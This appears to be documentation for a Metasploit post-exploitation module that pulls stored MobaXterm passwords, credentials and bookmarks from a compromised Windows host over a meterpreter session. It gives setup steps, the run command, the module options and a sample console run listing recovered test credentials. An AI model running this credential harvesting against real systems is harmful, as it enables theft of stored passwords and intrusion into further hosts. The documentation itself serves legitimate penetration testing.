## Vulnerable Application

  Any Windows host with a `meterpreter` session and MobaXterm v20.6+
  installed. The following passwords will be searched for and recovered:

### Installation Steps

  1. Download the latest installer of MobaXterm.
  2. Select default installation
  3. Open the software and click "Setting" in the toolbar, `General > MobaXterm password management > Master Password setting`
     complete password setting, add the test account password to the certificate.

## Verification Steps

  1. Get a `meterpreter` session on a Windows host.
  2. Do: ```run post/windows/gather/credentials/moba_xterm```
  3. If the system has registry keys for MobaXterm passwords they will be printed out.

## Options

 **MASTER_PASSWORD**

- If you know the password, you can skip decrypting the master password. If not, it will be decrypted automatically

 **CONFIG_PATH**

- Specifies the config file path for MobaXterm

## Scenarios

```

msf6 post(windows/gather/credentials/moba_xterm) > run
[*] Gathering MobaXterm session information from WIN-79MR8QJM50N
[!] Parsing is not supported: #84#9%C:\Users\FireEye\Desktop%0%#MobaFont%10%0%0%-1%15%236,236,236%30,30,30%180,180,192%0%-1%0%%xterm%-1%-1%_Std_Colors_0_%80%24
%0%1%-1%<none>%%0#0# #-1
[!] Parsing is not supported: #131#8%0%1009600%3%0%0%1%2%COM2  (ͨ˿ (COM2))#MobaFont%10%0%0%-1%15%236,236,236%30,30,30%180,180,192%0%-1%0%%xterm%-1%-1%_Std_Color
s_0_%80%24%0%1%-1%<none>%%0#0# #-1
[!] Parsing is not supported: #97#10%0%#MobaFont%10%0%0%-1%15%236,236,236%30,30,30%180,180,192%0%-1%0%%xterm%-1%-1%_Std_Colors_0_%80%24%0%1%-1%<none>%%0#0# #-1
[!] Parsing is not supported: #88#3%%0%-1%0%0%0%localhost%7100%1%0%1%0%657%336%0%0#MobaFont%10%0%0%-1%15%236,236,236%30,30,30%180,180,192%0%-1%0%%xterm%-1%-1%_
Std_Colors_0_%80%24%0%1%-1%<none>%%0#0# #-1
[+] MobaXterm Password
==================       
                                                                                                                                                               
Protocol  Hostname    Username  Password                                                                                                                       
--------  --------    --------  --------                                                                                                                       
          mobaserver  mobauser  278804moba14071pass317387                                                                                                      
                                                                                                                                                               
[+] MobaXterm Credentials
=====================

CredentialsName  Username  Password
---------------  --------  --------
ftp              1212
ssh              root      admin

[+] MobaXterm Bookmarks
===================

BookmarksName  Protocol  ServerHost           Port  Credentials or Passwords
-------------  --------  ----------           ----  ------------------------
ftp            ftp       ftp.asdas.com        21    asdas
msf            telnet    msf                  23    msf
rdp (rdp)      rdp       rdp                  3389  rdp
rsh            rsh       rdp.baid.com         rsh   #MobaFont
sftp           sftp      sftp.asdasd.com      22    asdasd
ssh            ssh       127.0.0.1            22    [ssh]
telnet_test    telnet    telnet.kali-team.cn  23    admin
vnc            vnc       vnc.basbas.com       5900  -1


```
